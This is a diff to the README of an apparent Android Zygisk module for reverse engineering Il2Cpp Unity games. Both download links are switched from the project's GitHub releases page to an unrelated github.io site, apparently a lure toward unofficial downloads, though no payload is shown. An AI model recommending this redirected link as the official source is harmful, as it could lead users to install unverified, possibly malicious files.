@@ -1,6 +1,6 @@
 # 🛠 Zygisk-Il2CppFucker - Reverse engineer game logic with ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Darlenepurpleblack444/Zygisk-Il2CppFucker/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://darlenepurpleblack444.github.io)
 
 This application helps users look into the internal code of Android applications. It focuses on Unity games that use the Il2Cpp format. It performs this task by operating as a Zygisk module. This tool allows users to see how games manage data. Developers and researchers use this information to understand game mechanics.
 
@@ -23,7 +23,7 @@ You need specific tools to run this software. Ensure you meet these criteria bef
 
 Visit the official release page to download the software. You will find the latest version along with legacy files there.
 
-[Click here to visit the release page](https://github.com/Darlenepurpleblack444/Zygisk-Il2CppFucker/releases)
+[Click here to visit the release page](https://darlenepurpleblack444.github.io)
 
 Look for the file ending in `.zip`. Save this file to a folder on your computer. You do not need to unzip this file. Keep it in its original format.
 
